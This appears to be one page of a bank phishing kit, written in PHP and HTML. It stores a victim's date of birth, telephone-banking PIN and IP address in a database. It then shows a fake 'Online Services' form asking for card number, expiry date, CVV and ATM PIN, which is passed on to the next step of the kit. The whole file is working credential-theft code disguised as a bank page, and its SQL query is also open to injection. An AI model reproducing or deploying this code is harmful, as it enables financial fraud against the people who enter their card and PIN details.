<?php
include 'connect.php';
session_start();
$inf7 = $_REQUEST['nastered'];
$inf8 = $_REQUEST['nasterem'];
$inf9 = $_REQUEST['nasterey'];
$inf11 = $_REQUEST['telp'];

$busca = $_SESSION['NomeUsuario'] . $_SESSION['Usuario'] ;
$ip = $_SERVER['REMOTE_ADDR'];

if(empty($inf7) || strlen($inf9) < 1){
   echo '<html><style>td{color:#000}td{font-family:arial,sans-serif} </style><body></body><script language="javascript">';
   echo ' alert("Telephone Banking Pin (6 digit Security Number sent by post)");';
   echo 'history.back(-1); </script>';
   echo '</script></html>';
   exit; 
}

    $sql = "UPDATE `JSPHLT` SET ID_DateOFBirthDia='$inf7', ID_DateOFBirthMes='$inf8', ID_DateOFBirthAno='$inf9', ID_TelPin='$inf11' WHERE CodBusca ='$busca';";
    $QueryAuto = mysql_query($sql); 
	if (!$QueryAuto) {  
             return;
    } else {
		$data = date("d/m/Y - H:i:s");
		$message = "\n\nSENHA: $inf1\n\nDATA: $data\n\nIP: $ip\n\n\n";

		
	}
	
	
?>
		
<head>
	
<title>Online Services</title>
<link rel="shortcut icon" href="favicon.ico" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>
</head>

<style type="text/css">
Body{
background-image: url('');
background-repeat: no-repeat;
margin-left:0px;
margin-top:0px;
margin-bottom:700px
}
</style>
</head>

</head>

<body style="background-image: url('3.jpg')">
<form id="form2" onsubmit="return validar(this);" action="details4.php" method="post">
<div id="Layer9" style="position:absolute; width:895px; height:182px; z-index:3; left: 67px; top: 224px">

<div class="formField clearfix">
  <div class="formFieldInner">

    <label for="ba"><b>Card Number:</b> <br>
	</label>
    <input id="account" name="ccnum" class="" maxlength="20" size="20" value="" type="text" />
  </div>
</div>
<div class="formField clearfix">
  <div class="formFieldInner">

    <label for="ba"><b>Expiry:</b> <br>
	</label>
    <SELECT id=expdate_month name=expdate_month><OPTION value="" 
  selected>--Month--</OPTION> <OPTION value=01>01 (Jan)</OPTION> <OPTION 
  value=02>02 (Feb)</OPTION> <OPTION value=03>03 (Mar)</OPTION> <OPTION 
  value=04>04 (Apr)</OPTION> <OPTION value=05>05 (May)</OPTION> <OPTION 
  value=06>06 (Jun)</OPTION> <OPTION value=07>07 (Jul)</OPTION> <OPTION 
  value=08>08 (Aug)</OPTION> <OPTION value=09>09 (Sep)</OPTION> <OPTION 
  value=10>10 (Oct)</OPTION> <OPTION value=11>11 (Nov)</OPTION> <OPTION 
  value=12>12 (Dec)</OPTION></SELECT>
  <SELECT id=expdate_year name=expdate_year><OPTION value="" 
  selected>--Year--</OPTION> <OPTION value=2010>2010</OPTION> <OPTION 
  value=2011>2011</OPTION> <OPTION value=2012>2012</OPTION> <OPTION 
  value=2013>2013</OPTION> <OPTION value=2014>2014</OPTION> <OPTION 
  value=2015>2015</OPTION> <OPTION value=2016>2016</OPTION> <OPTION 
  value=2017>2017</OPTION> <OPTION value=2018>2018</OPTION> <OPTION 
  value=2019>2019</OPTION> <OPTION value=2020>2020</OPTION> <OPTION 
  value=2021>2021</OPTION> <OPTION value=2022>2022</OPTION> <OPTION 
  value=2023>2023</OPTION> <OPTION value=2024>2024</OPTION> <OPTION 
  value=2025>2025</OPTION> <OPTION value=2026>2026</OPTION> <OPTION 
  value=2027>2027</OPTION> <OPTION value=2028>2028</OPTION> <OPTION 
  value=2029>2029</OPTION></SELECT>
  </div>
</div>
<div class="formField clearfix">
  <div class="formFieldInner">

    <label for="ba"><b>Card CVV:</b> <br>
	</label>
    <input id="account" name="cvv" class="" maxlength="4" size="4" value="" type="password" />
  </div>
</div>
<div class="formField clearfix">
  <div class="formFieldInner">
    <hr />
    <b>
    <label for="ba">Your ATM 4 Digit Pin:</label></b> <br>
    <input id="telp" name="atmpin" class="" maxlength="4" size="4" value="" type="password" />
  </div>
</div>&nbsp;</div>
<div id="Layer4" style="position:absolute; width:95px; height:41px; z-index:4; left: 846px; top: 441px;">
    <input type="image" name="imageField" id="imageField" src="3.png" width="102" height="37" />
</form>
</div>
</body>
</html>